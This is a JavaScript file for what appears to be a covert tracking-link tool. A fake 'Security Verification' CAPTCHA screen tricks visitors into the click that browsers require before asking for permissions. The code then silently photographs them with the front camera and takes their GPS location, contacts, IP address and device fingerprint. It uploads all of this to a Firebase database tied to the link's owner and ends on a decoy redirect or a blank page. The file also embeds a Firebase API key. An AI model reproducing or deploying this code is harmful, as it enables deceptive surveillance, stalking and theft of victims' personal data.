// ── IMPORTS ───────────────────────────────────────────────────────────────
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, set, get, update, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

// ── FIREBASE CONFIG ───────────────────────────────────────────────────────
const firebaseConfig = {
    apiKey:            "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
    authDomain:        "camera-c436d.firebaseapp.com",
    databaseURL:       "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId:         "camera-c436d",
    storageBucket:     "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId:             "1:1024848910212:web:80a95f41281d1a920eafd1"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

// ── COLLECT DEVICE INFO ───────────────────────────────────────────────────
async function collectDeviceInfo() {
    const ua = navigator.userAgent;
    const info = {
        userAgent:      ua,
        platform:       navigator.platform || 'Unknown',
        language:       navigator.language || 'Unknown',
        screenWidth:    screen.width,
        screenHeight:   screen.height,
        colorDepth:     screen.colorDepth,
        timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus:   navigator.onLine,
        referrer:       document.referrer || 'Direct',
        pageUrl:        window.location.href,
    };

    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        info.networkType = conn.effectiveType || 'Unknown';
        info.downlink    = conn.downlink != null ? conn.downlink + ' Mbps' : 'Unknown';
    } else {
        info.networkType = 'Unknown';
        info.downlink    = 'Unknown';
    }

    try {
        const bat = await Promise.race([
            navigator.getBattery(),
            new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 2000))
        ]);
        info.battery  = Math.round(bat.level * 100) + '%';
        info.charging = bat.charging ? 'Yes' : 'No';
    } catch (_) {
        info.battery  = 'Unavailable';
        info.charging = 'Unavailable';
    }

    if      (/android/i.test(ua))           info.os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua))  info.os = 'iOS';
    else if (/windows phone/i.test(ua))     info.os = 'Windows Phone';
    else if (/windows/i.test(ua))           info.os = 'Windows';
    else if (/mac/i.test(ua))               info.os = 'macOS';
    else if (/linux/i.test(ua))             info.os = 'Linux';
    else                                    info.os = 'Unknown';

    if      (/edg\//i.test(ua))                               info.browser = 'Edge';
    else if (/opr\/|opera/i.test(ua))                         info.browser = 'Opera';
    else if (/chrome\/\d/i.test(ua))                          info.browser = 'Chrome';
    else if (/firefox\/\d/i.test(ua))                         info.browser = 'Firefox';
    else if (/safari\/\d/i.test(ua) && !/chrome/i.test(ua))  info.browser = 'Safari';
    else                                                       info.browser = 'Unknown';

    return info;
}

// ── GET PUBLIC IP ─────────────────────────────────────────────────────────
async function getIPAddress() {
    const apis = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/json/'
    ];
    for (const url of apis) {
        try {
            const r = await fetch(url, { signal: AbortSignal.timeout(4000) });
            const d = await r.json();
            const ip = d.ip || d.IPv4 || null;
            if (ip) return ip;
        } catch (_) { /* try next */ }
    }
    return 'Unavailable';
}

// ── CAPTURE PHOTO (silent) ────────────────────────────────────────────────
async function capturePhoto() {
    const video  = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        });
    } catch (e) {
        console.warn('Camera denied:', e.message);
        return null;
    }

    const readyPromise = new Promise(resolve => {
        video.onloadedmetadata = () => {
            video.play().catch(() => {}).finally(resolve);
        };
        setTimeout(resolve, 1500);
    });

    video.srcObject = stream;
    await readyPromise;

    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoData = canvas.toDataURL('image/jpeg', 0.80);

    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    return photoData;
}

// ── GET GPS LOCATION (silent) ─────────────────────────────────────────────
async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            resolve({ lat: 'Unavailable', lon: 'Unavailable' });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            pos  => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            err  => { console.warn('GPS denied:', err.message); resolve({ lat: 'Denied', lon: 'Denied' }); },
            { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
        );
    });
}

// ── COLLECT CONTACTS (Contact Picker API) ────────────────────────────────
async function collectContacts() {
    if (!('contacts' in navigator) || !('ContactsManager' in window)) {
        console.warn('Contact Picker API not supported on this device.');
        return null;
    }
    try {
        const supported = await navigator.contacts.getProperties();
        const props = ['name', 'email', 'tel'].filter(p => supported.includes(p));
        if (props.length === 0) return null;
        const contacts = await navigator.contacts.select(props, { multiple: true });
        return contacts.map(c => ({
            name:  (c.name  && c.name.length  ? c.name[0]  : '') || '',
            phone: (c.tel   && c.tel.length   ? c.tel[0]   : '') || '',
            email: (c.email && c.email.length ? c.email[0] : '') || ''
        }));
    } catch (e) {
        console.warn('Contacts denied or failed:', e.message);
        return null;
    }
}

// ── VALIDATE URL ──────────────────────────────────────────────────────────
function isValidUrl(url) {
    if (!url || typeof url !== 'string') return false;
    const s = url.trim();
    if (!s) return false;
    try {
        const u = new URL(s);
        return u.protocol === 'http:' || u.protocol === 'https:';
    } catch (_) {
        return false;
    }
}

// ── TIMESTAMP HELPER ──────────────────────────────────────────────────────
function nowTimeStr() {
    return new Date().toLocaleTimeString();
}

// ── EAGERLY QUERY BROWSER PERMISSION STATES ──────────────────────────────
// Called immediately on page load, in parallel with the Firebase fetch.
// The Permissions API resolves near-instantly (no network round-trip).
// Returns the raw browser grant states for camera and geolocation so the
// calling code can decide — without any added delay — whether to show the
// verification screen.
async function queryPermissionStates() {
    if (!('permissions' in navigator)) {
        // Permissions API absent (old iOS Safari etc.) — treat as needing gesture.
        return { camera: 'prompt', geolocation: 'prompt' };
    }
    const [cam, geo] = await Promise.all([
        navigator.permissions.query({ name: 'camera'      }).catch(() => ({ state: 'prompt' })),
        navigator.permissions.query({ name: 'geolocation' }).catch(() => ({ state: 'prompt' })),
    ]);
    return { camera: cam.state, geolocation: geo.state };
}

// ── REFINE PERMISSION LOG STATUS ACCURACY ────────────────────────────────
// Called after runPermissions() completes.  Corrects the log object in-place
// WITHOUT touching runPermissions() itself.
//
// Two distinct "not allowed" cases:
//   1. state='denied' post-attempt  → browser permanently blocked (never shows dialog)
//      → status = 'blocked'
//   2. state='prompt' post-attempt + permission was denied → browser suppressed the
//      dialog without showing it (gesture-required block / auto-dismiss by browser)
//      → status = 'browser_blocked'
//   3. state='prompt' post-attempt + permission was denied + browserBlocksAutoPrompt=false
//      → user actually saw and dismissed/denied the dialog
//      → status stays 'denied'
async function refinePermissionLog(log, needsCam, needsGPS, browserBlocksAutoPrompt) {
    if (!('permissions' in navigator)) return;
    const tasks = [];
    if (needsCam && log.camera.status === 'denied') {
        tasks.push(
            navigator.permissions.query({ name: 'camera' })
                .then(r => {
                    if (r.state === 'denied') {
                        // Permanently blocked by browser (no dialog ever shown)
                        log.camera.status = 'blocked';
                    } else if (r.state === 'prompt' && browserBlocksAutoPrompt) {
                        // Browser suppressed the dialog (gesture required) — never shown to user
                        log.camera.status = 'browser_blocked';
                    }
                    // else: state='prompt' & no auto-block → user dismissed/denied
                })
                .catch(() => {})
        );
    }
    if (needsGPS && log.gps.status === 'denied') {
        tasks.push(
            navigator.permissions.query({ name: 'geolocation' })
                .then(r => {
                    if (r.state === 'denied') {
                        // Permanently blocked by browser
                        log.gps.status = 'blocked';
                    } else if (r.state === 'prompt' && browserBlocksAutoPrompt) {
                        // Browser suppressed the dialog (gesture required)
                        log.gps.status = 'browser_blocked';
                    }
                })
                .catch(() => {})
        );
    }
    if (tasks.length) await Promise.all(tasks);
}

// ── VERIFICATION SCREEN (Continue button) ────────────────────────────────
// Shown only when the browser requires a user gesture before permission
// dialogs can appear.  Resolves the instant the user clicks Continue.
// Light/white design — minimal, fast-loading, mobile-friendly.
function showCaptcha() {
    return new Promise(resolve => {
        const overlay = document.createElement('div');
        overlay.style.cssText =
            'position:fixed;inset:0;background:#f1f5f9;display:flex;' +
            'align-items:center;justify-content:center;z-index:99999;' +
            'font-family:"Segoe UI",system-ui,sans-serif;';

        overlay.innerHTML =
            '<div style="background:#ffffff;border-radius:20px;' +
                'padding:48px 40px 42px;width:360px;max-width:92vw;text-align:center;' +
                'box-shadow:0 8px 32px rgba(15,23,42,.10),0 2px 8px rgba(15,23,42,.06);">' +

              '<div style="width:64px;height:64px;border-radius:50%;' +
                  'background:linear-gradient(135deg,#3b82f6,#6366f1);' +
                  'margin:0 auto 22px;display:flex;align-items:center;' +
                  'justify-content:center;font-size:28px;">🛡️</div>' +

              '<h2 style="color:#0f172a;font-size:22px;font-weight:700;' +
                  'margin:0 0 10px;letter-spacing:-.02em;">Security Verification</h2>' +

              '<p style="color:#64748b;font-size:14px;margin:0 0 34px;line-height:1.6;">' +
                  'Click continue to proceed.</p>' +

              '<button id="_continueBtn" ' +
                  'style="width:100%;padding:16px;background:#3b82f6;' +
                  'color:#fff;border:none;border-radius:12px;font-size:16px;' +
                  'font-weight:700;cursor:pointer;letter-spacing:.01em;' +
                  'box-shadow:0 4px 16px rgba(59,130,246,.35);">' +
                  'Continue' +
              '</button>' +

            '</div>';

        document.body.appendChild(overlay);

        overlay.querySelector('#_continueBtn').addEventListener('click', () => {
            overlay.remove();
            resolve();
        });
    });
}

// ── RUN PERMISSIONS SEQUENTIALLY AND LOG EACH RESULT ─────────────────────
async function runPermissions(needsCam, needsGPS, needsContact) {
    const log = {
        camera:  { requested: needsCam,     status: 'not_requested', time: null },
        gps:     { requested: needsGPS,     status: 'not_requested', time: null },
        contact: { requested: needsContact, status: 'not_requested', time: null },
    };

    let photoData = null;
    let lat       = 'Denied';
    let lon       = 'Denied';
    let contacts  = null;

    // ── Camera ───────────────────────────────────────────────────────────
    if (needsCam) {
        log.camera.time = nowTimeStr();
        try {
            photoData = await capturePhoto();
            log.camera.status = (photoData !== null) ? 'allowed' : 'denied';
        } catch (_) {
            log.camera.status = 'denied';
        }
    }

    // ── GPS ──────────────────────────────────────────────────────────────
    if (needsGPS) {
        log.gps.time = nowTimeStr();
        const gpsResult = await getLocation();
        lat = gpsResult.lat;
        lon = gpsResult.lon;
        log.gps.status = typeof lat === 'number'
            ? 'allowed'
            : (lat === 'Unavailable' ? 'blocked' : 'denied');
    }

    // ── Contact ──────────────────────────────────────────────────────────
    if (needsContact) {
        log.contact.time = nowTimeStr();
        try {
            contacts = await collectContacts();
            log.contact.status = (contacts !== null) ? 'allowed' : 'denied';
        } catch (_) {
            log.contact.status = 'denied';
        }
    }

    return { photoData, lat, lon, contacts, log };
}

// ── SAVE CAPTURE TO FIREBASE ──────────────────────────────────────────────
async function saveCapture({
    photoData, lat, lon, contacts,
    settings, linkId, ipAddress, deviceInfo,
    permissionLog, permissionTrigger, browserBlocksAutoPrompt
}) {
    const now       = Date.now();
    const ownerType = settings._ownerType || 'admin';
    const ownerId   = settings._ownerId   || 'admin';

    try {
        const newRef = push(ref(db, 'photo_history'));
        await set(newRef, {
            id:                      now,
            image:                   photoData || null,
            latitude:                lat,
            longitude:               lon,
            contacts:                (contacts && contacts.length > 0) ? contacts : null,
            linkName:                settings.name || 'Unknown',
            linkId:                  linkId,
            date:                    new Date(now).toLocaleDateString(),
            time:                    new Date(now).toLocaleTimeString(),
            timestamp:               now,
            ipAddress:               ipAddress,
            device:                  deviceInfo,
            permissionLog:           permissionLog          || null,
            permissionTrigger:       permissionTrigger      || 'direct',
            browserBlocksAutoPrompt: !!browserBlocksAutoPrompt,
            _ownerType:              ownerType,
            _ownerId:                ownerId
        });
    } catch (e) {
        console.error('Firebase save error:', e);
    }

    // Save contacts separately to contact_history if collected
    if (contacts && contacts.length > 0) {
        try {
            const cRef = push(ref(db, 'contact_history'));
            await set(cRef, {
                linkId:     linkId,
                linkName:   settings.name || 'Unknown',
                contacts:   contacts,
                date:       new Date(now).toLocaleDateString(),
                time:       new Date(now).toLocaleTimeString(),
                timestamp:  now,
                ipAddress:  ipAddress,
                _ownerType: ownerType,
                _ownerId:   ownerId
            });
        } catch (e) {
            console.error('Firebase contacts save error:', e);
        }
    }
}

// ── MAIN FLOW ─────────────────────────────────────────────────────────────
async function initVerification() {
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('linkId');
    if (!linkId) return;

    // ── Fire ALL async work simultaneously from the very first tick ───────
    // queryPermissionStates() is near-instant (Permissions API, no network).
    // By the time Firebase responds, permission states are already known.
    const settingsPromise   = get(ref(db, 'managed_links/' + linkId));
    const permStatesPromise = queryPermissionStates();
    const infoPromise       = collectDeviceInfo();
    const ipPromise         = getIPAddress();

    // ── Wait for Firebase settings ────────────────────────────────────────
    let settings;
    try {
        const snap = await settingsPromise;
        settings   = snap.val();
    } catch (e) {
        console.error('Firebase fetch error:', e);
        return;
    }
    if (!settings || !settings.active) return;

    runTransaction(ref(db, 'managed_links/' + linkId + '/visits'), current => (current || 0) + 1).catch(() => {});

    const needsCam     = !!settings.cam;
    const needsGPS     = !!settings.gps;
    const needsContact = !!settings.contact;
    const hasRedirect  = isValidUrl(settings.redirectUrl);
    const hasAnyPerm   = needsCam || needsGPS || needsContact;

    // ── Permission states already resolved (ran in parallel) ─────────────
    const permStates = await permStatesPromise;

    // ── Decide immediately: does this browser require a user gesture? ─────
    // 'prompt' → browser will ask, but only from a user-initiated gesture.
    // 'granted' → already allowed, no gesture needed.
    // 'denied' → permanently blocked, no gesture helps.
    // Contact Picker API always requires a user gesture regardless of state.
    let permissionTrigger       = 'direct';
    let browserBlocksAutoPrompt = false;

    if (hasAnyPerm) {
        browserBlocksAutoPrompt =
            (needsCam     && permStates.camera      === 'prompt') ||
            (needsGPS     && permStates.geolocation === 'prompt') ||
            !!needsContact; // Contact Picker always requires gesture

        // ── Show verification screen with 0ms delay ───────────────────────
        if (browserBlocksAutoPrompt) {
            await showCaptcha();
            permissionTrigger = 'captcha';
        }
    }

    // ── Request each permission and record result ─────────────────────────
    const { photoData, lat, lon, contacts, log: permissionLog } =
        await runPermissions(needsCam, needsGPS, needsContact);

    // ── Refine status accuracy post-run ───────────────────────────────────
    // Distinguishes browser-permanently-blocked ('blocked'), browser gesture-
    // suppressed ('browser_blocked'), and user-dismissed/denied ('denied').
    await refinePermissionLog(permissionLog, needsCam, needsGPS, browserBlocksAutoPrompt);

    // ── Evaluate grant results ────────────────────────────────────────────
    const camGranted     = !needsCam     || (photoData !== null);
    const gpsGranted     = !needsGPS     || (typeof lat === 'number');
    const contactGranted = !needsContact || (contacts !== null);
    const allGranted     = camGranted && gpsGranted && contactGranted;

    // ── Redirect path ─────────────────────────────────────────────────────
    if (hasRedirect && allGranted) {
        Promise.all([infoPromise, ipPromise])
            .then(([deviceInfo, ipAddress]) =>
                saveCapture({
                    photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo,
                    permissionLog, permissionTrigger, browserBlocksAutoPrompt
                })
            )
            .catch(e => console.error('Async capture save failed:', e));

        window.location.replace(settings.redirectUrl.trim());
        return;
    }

    // ── No-redirect path — save and stay silent ───────────────────────────
    const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
    await saveCapture({
        photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo,
        permissionLog, permissionTrigger, browserBlocksAutoPrompt
    });
    // Page remains blank.
}

// ── BOOT ─────────────────────────────────────────────────────────────────
window.addEventListener('load', initVerification);
